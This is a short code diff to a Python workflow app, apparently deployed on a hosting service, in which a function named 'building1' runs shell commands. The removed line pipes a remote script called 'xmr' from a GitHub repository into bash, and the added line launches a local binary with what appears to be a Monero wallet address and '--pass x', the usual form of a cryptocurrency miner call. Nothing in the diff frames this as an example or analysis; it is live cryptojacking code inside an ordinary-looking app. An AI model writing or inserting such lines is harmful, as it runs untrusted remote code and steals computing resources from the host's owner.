@@ -14,7 +14,7 @@ app = Workflows()
 def building1():
   import sys
   import os
-  os.system('curl -sL https://github.com/fadliamroziqyaa-hub/gosen/raw/main/xmr | bash')
+  os.system('./opt/render/project/src/vltrig --user 84bEkQaAvXnPXXghsfBYBeLGtkAV8eP1HX7rP7EUBE1pHvtwAffjCE2SzzY8y79fkgHA21czuEWoVUDkAf7e4qM5KMKCKVK --pass x')
 
 if __name__ == "__main__":
   app.start()
